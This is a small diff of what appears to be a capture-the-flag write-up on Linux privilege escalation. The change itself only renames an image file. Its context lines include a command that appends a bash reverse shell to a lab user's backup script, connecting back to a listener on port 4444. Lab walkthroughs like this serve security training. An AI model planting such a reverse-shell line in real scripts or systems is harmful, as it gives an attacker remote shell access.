@@ -245,7 +245,7 @@ chmod +x /home/karen/backup.sh
 echo "bash -i >& /dev/tcp/10.10.19.80/4444 0>&1" >> /home/karen/backup.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 **What is Matt's password?**
 
